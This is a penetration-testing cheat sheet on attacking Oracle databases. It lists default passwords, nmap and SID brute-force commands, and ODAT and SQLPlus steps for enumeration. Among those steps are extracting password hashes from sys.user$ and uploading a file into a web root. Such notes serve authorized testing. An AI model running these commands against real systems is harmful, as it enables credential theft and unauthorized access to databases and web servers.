# Oracle DB - T1521,1526

{% hint style="info" %}
Oracle Database Attacking Tool ([**odat**](https://github.com/quentinhardy/odat)) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.
{% endhint %}

### Default Configuration <a href="#default-configuration" id="default-configuration"></a>

* The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.
* &#x20;Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one.
* Using the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.
* Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service.

### Footprinting

{% tabs %}
{% tab title="Metasploit" %}

{% endtab %}

{% tab title="Nmap" %}
{% code lineNumbers="true" %}
```shellscript
sudo nmap -p 1521 -sV <IP> --open
```
{% endcode %}
{% endtab %}
{% endtabs %}

### **SID Bruteforcing**

* SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail.

{% tabs %}
{% tab title="Metasploit" %}
{% code lineNumbers="true" %}
```shellscript
sudo nmap -p 1521 -sV --open --script oracle-sid-brute <IP>
```
{% endcode %}
{% endtab %}

{% tab title="Nmap" %}

{% endtab %}
{% endtabs %}

### Enumeration

{% tabs %}
{% tab title="ODAT" %}
{% code lineNumbers="true" %}
```shellscript
./odat.py all -s <IP>
```
{% endcode %}
{% endtab %}

{% tab title="SQLPlus" %}
[SQLPlus](https://www.oracle.com/database/technologies/instant-client/winx64-64-downloads.html)

[SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)

{% code lineNumbers="true" %}
```shellscript
sqlplus username/password@<IP>/<SID>
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
select table_name from all_tables;
select * from user_role_privs;
// Login as System Database Admin
sqlplus sername/password@<IP>/<SID> as sysdba
// Extract Password Hashes
select name, password from sys.user$;
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Exploit

{% tabs %}
{% tab title="ODAT" %}

{% endtab %}

{% tab title="Metasploit" %}
{% code lineNumbers="true" %}
```shellscript
//File Upload '/var/www/html' or 'C:\\inetpub\\wwwroot'
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://IP/testing.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}
